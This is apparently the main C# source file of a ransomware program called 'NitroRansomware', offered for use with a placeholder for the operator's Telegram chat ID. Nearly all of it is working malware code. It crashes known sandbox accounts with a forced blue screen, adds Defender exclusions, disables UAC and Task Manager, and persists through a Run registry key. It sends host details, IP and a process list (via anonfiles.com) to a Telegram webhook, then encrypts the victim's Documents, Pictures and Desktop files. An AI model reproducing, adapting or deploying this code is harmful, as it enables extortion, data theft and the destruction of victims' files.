using System;
using System.Collections.Generic;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;
using System.Diagnostics;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Management;
using System.Drawing;
using System.Drawing.Imaging;
using System.Net;
using System.Net.Http;
using System.Text.RegularExpressions;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;


namespace NitroRansomware
{
    class Program
    {
        static string desktop = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
        static string documents = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
        static string pictures = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);

        public static string WEBHOOK = "Put your Chat ID here"; //Telegram ChatID here Go to Webhook.cs to put your Telegram Token There
        public static string DECRYPT_PASSWORD = "e14a1a875002aa43e3b7869ef81c4f675abfcfa3563a2dbd191d0c96a03a7c75/";

        static Logs logging = new Logs("DEBUG", 0);
        static Webhook ww = new Webhook(WEBHOOK);

        [DllImport("ntdll.dll")]
        public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);

        [DllImport("ntdll.dll")]
        public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);

        static async Task Main(string[] args)
        {
            Process currentProcess = Process.GetCurrentProcess();

            // Set processor affinity to a specific processor or processors
            // In this example, we set it to the first processor (index 0)
            currentProcess.ProcessorAffinity = new IntPtr(1);

            // Set the process priority to high
            currentProcess.PriorityClass = ProcessPriorityClass.High;

            string pcUsername = Environment.UserName;

            List<string> bannedUsernames = new List<string>
        {
            "WDAGUtilityAccount",
            "Abby",
            "hmarc",
            "patex",
            "RDhJ0CNFevzX",
            "kEecfMwgj",
            "Frank",
            "8Nl0ColNQ5bq",
            "Lisa",
            "John",
            "george",
            "PxmdUOpVyx",
            "8VizSM",
            "w0fjuOVmCcP5A",
            "lmVwjj9b",
            "PqONjHVwexsS",
            "3u2v9m8",
            "Julia",
            "HEUeRzl",
            "fred",
            "server",
            "BvJChRPnsxn",
            "Harry Johnson",
            "SqgFOf3G",
            "Lucas",
            "mike",
            "PateX",
            "h7dk1xPr",
            "Louise",
            "User01",
            "test",
            "RGzcBUyrznReg"
        };

            if (bannedUsernames.Contains(pcUsername.ToLower()))
            {
                Console.WriteLine("PC username is not allowed.");
                Boolean t1;
                uint t2;
                RtlAdjustPrivilege(19, true, false, out t1);
                NtRaiseHardError(0xc0000022, 0, 0, IntPtr.Zero, 6, out t2);
                Application.Exit();
            }
            else
            {
                Console.WriteLine("PC username is allowed.");
            }

            if (Installed())
            {
                Exclusions();
                DisableUAC();
                DisableTaskManager();
                Application.Run(new Form1());
            }
            else
            {
                Exclusions();
                DisableUAC();
                DisableTaskManager();
                Duplicate();
                StartUp();
                await Setup();
                EncryptAll();
                Temp();
                Thread.Sleep(6000);
                Application.Run(new Form1());
            }
        }
        static void Exclusions()
        {
            string localAppDataTemp = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Temp";
            string cDrive = @"C:\";

            AddExclusion(localAppDataTemp);
            AddExclusion(cDrive);
        }

        static void AddExclusion(string path)
        {
            RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows Defender\Exclusions\Paths", true);
            if (key != null)
            {
                key.SetValue(path, 0x00000010, RegistryValueKind.DWord);
                key.Close();
                Console.WriteLine($"Exclusion for {path} added successfully.");
            }
            else
            {
                Console.WriteLine($"Failed to access the registry key for {path}.");
            }
        }

        static async Task Setup()
        {
            logging.Debug("Setup start");

            string gpuInfo = GetGPUInformation();
            string memoryInfo = GetMemoryInformation();
            string cpuInfo = GetCPUInformation();
            string storageInfo = GetStorageInformation();

            List<string> pcDetails = User.GetDetails();
            string uuid = User.GetIdentifier();
            string ip = User.GetIP();

            // Execute tasklist command and capture output
            Process process = new Process();
            process.StartInfo.FileName = "tasklist";
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.RedirectStandardOutput = true;
            process.Start();

            string output = process.StandardOutput.ReadToEnd();
            process.WaitForExit();

            // Save output to a text file
            string filePath = "tasklist_output.txt";
            File.WriteAllText(filePath, output);

            // Upload the file to AnonFiles
            string uploadUrl = await UploadToAnonFiles(filePath);

            await ww.SendAsync($"Program executed✅\nStatus: Active✅ \n💻PC Name: {pcDetails[0]}\n👤User:{pcDetails[1]}\n👷‍UUID: {uuid}\n🌍IP Address: {ip}\n🧠CPU Info:\n{cpuInfo} \n📝Memory info:\n{memoryInfo}\n🎮GPU Info:\n{gpuInfo}\n📁Stroage Info:\n{storageInfo}\n🐛Here are the link of EXES running on the computer\n {uploadUrl}\n\n🔒Updated By https://github.com/ThunderboltDev Enjoy!🔒 ");
            await ww.SendAsync($"Decryption Key: {DECRYPT_PASSWORD}🔐");
        }



        static string GetGPUInformation()
        {
            string gpuInfo = "";
            ManagementObjectSearcher gpuSearcher = new ManagementObjectSearcher("SELECT * FROM Win32_VideoController");
            ManagementObjectCollection gpuCollection = gpuSearcher.Get();

            foreach (ManagementObject obj in gpuCollection)
            {
                string name = obj["Name"].ToString();
                string driverVersion = obj["DriverVersion"].ToString();
                gpuInfo += $"Name: {name}\nDriver Version: {driverVersion}\n\n";
            }

            return gpuInfo;
        }


        static string GetMemoryInformation()
        {
            string memoryInfo = "";
            ManagementObjectSearcher memorySearcher = new ManagementObjectSearcher("SELECT * FROM Win32_PhysicalMemory");
            ManagementObjectCollection memoryCollection = memorySearcher.Get();

            foreach (ManagementObject obj in memoryCollection)
            {
                string manufacturer = obj["Manufacturer"].ToString();
                ulong capacity = Convert.ToUInt64(obj["Capacity"]);

                memoryInfo += $"Manufacturer: {manufacturer}\nCapacity: {capacity / (1024 * 1024)} MB\n\n";
            }

            return memoryInfo;
        }

        static string GetCPUInformation()
        {
            string cpuInfo = "";
            ManagementObjectSearcher cpuSearcher = new ManagementObjectSearcher("SELECT * FROM Win32_Processor");
            ManagementObjectCollection cpuCollection = cpuSearcher.Get();

            foreach (ManagementObject obj in cpuCollection)
            {
                string name = obj["Name"].ToString();
                string maxClockSpeed = obj["MaxClockSpeed"].ToString();
                string numberOfCores = obj["NumberOfCores"].ToString();

                cpuInfo += $"Name: {name}\nMax Clock Speed: {maxClockSpeed} MHz\nNumber of Cores: {numberOfCores}\n\n";
            }

            return cpuInfo;
        }

        static string GetStorageInformation()
        {
            string storageInfo = "";
            ManagementObjectSearcher storageSearcher = new ManagementObjectSearcher("SELECT * FROM Win32_DiskDrive");
            ManagementObjectCollection storageCollection = storageSearcher.Get();

            foreach (ManagementObject obj in storageCollection)
            {
                string model = obj["Model"].ToString();
                string size = obj["Size"].ToString();

                storageInfo += $"Model: {model}\nSize: {Convert.ToUInt64(size) / (1024 * 1024 * 1024)} GB\n\n";
            }

            return storageInfo;
        }




        static void DisableUAC()
        {
            // Set the registry value to disable UAC
            Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "EnableLUA", 0, RegistryValueKind.DWord);
            Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "EnableLUA", 0, RegistryValueKind.DWord);

        }
        static void DisableTaskManager()
        {
            // Open the registry key for Task Manager settings
            using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System", true))
            {
                if (key != null)
                {
                    // Set the value of DisableTaskMgr to 1 to disable Task Manager
                    key.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
                }
                else
                {
                    // Key not found, handle the error
                    Console.WriteLine("Task Manager registry key not found.");
                }
            }
        }

        public static void EncryptAll()
        {
            ww.SendAsync("🔒Starting file encryption..🔒").GetAwaiter().GetResult();
            var t1 = new Thread(() => Crypto.EncryptContent(documents));
            var t2 = new Thread(() => Crypto.EncryptContent(pictures));
            var t3 = new Thread(() => Crypto.EncryptContent(desktop));
            t1.Start();
            t2.Start();
            t3.Start();

            t1.Join();
            t2.Join();
            t3.Join();
            ww.SendAsync($"✅Finished encrypting victim's files. Total number of files encrypted: {Crypto.encryptedFileLog.Count}✅").GetAwaiter().GetResult();
            Wallpaper.ChangeWallpaper();
        }

        public static void DecryptAll()
        {
            var t1 = new Thread(() => Crypto.DecryptContent(documents));
            var t2 = new Thread(() => Crypto.DecryptContent(pictures));
            var t3 = new Thread(() => Crypto.DecryptContent(desktop));

            t1.Start();
            t2.Start();
            t3.Start();

            t1.Join();
            t2.Join();
            t3.Join();
        }

        static void StartUp()
        {
            try
            {
                string filename = Process.GetCurrentProcess().ProcessName + ".exe";
                string loc = Path.GetTempPath() + filename;
                Console.WriteLine(loc);
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
                {
                    key.SetValue("NR", "\"" + loc + "\"");
                }
            }
            catch (Exception ex)
            {
                logging.Error(ex.Message);
            }
        }

        public static void RemoveStart()
        {
            if (Registry.GetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\", "NR", true) != null)
            {
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
                {
                    key.DeleteValue("NR", false);
                }
            }
        }

        static void Duplicate()
        {
            try
            {
                string filename = Process.GetCurrentProcess().ProcessName + ".exe";
                string filepath = Path.Combine(Environment.CurrentDirectory, filename);
                File.Copy(filepath, Path.GetTempPath() + filename);
                Console.WriteLine(Path.GetTempPath());
            }
            catch (Exception ex) { logging.Debug(ex.Message); }
        }

        static bool Installed()
        {
            if (Registry.GetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\", "NR", null) != null)
            {
                return true;
            }
            return false;
        }

        static void Temp()
        {
            string save = Path.GetTempPath() + "NR_decrypt.txt";
            Console.WriteLine(save);
            using (StreamWriter sw = new StreamWriter(save))
            {
                sw.WriteLine(DECRYPT_PASSWORD);
            }
        }
        static async Task<string> UploadToAnonFiles(string filePath)
        {
            using (HttpClient client = new HttpClient())
            using (MultipartFormDataContent formData = new MultipartFormDataContent())
            {
                byte[] fileBytes = File.ReadAllBytes(filePath);
                formData.Add(new ByteArrayContent(fileBytes), "file", "tasklist_output.txt");

                using (HttpResponseMessage response = await client.PostAsync("https://api.anonfiles.com/upload", formData))
                {
                    response.EnsureSuccessStatusCode();
                    var responseContent = await response.Content.ReadAsStringAsync();
                    var uploadUrl = ExtractUploadUrl(responseContent);
                    return uploadUrl;
                }
            }
        }

        static string ExtractUploadUrl(string responseContent)
        {
            dynamic jsonResponse = JsonConvert.DeserializeObject(responseContent);
            string uploadUrl = jsonResponse.data.file.url.full;
            return uploadUrl;
        }
    }
}

  
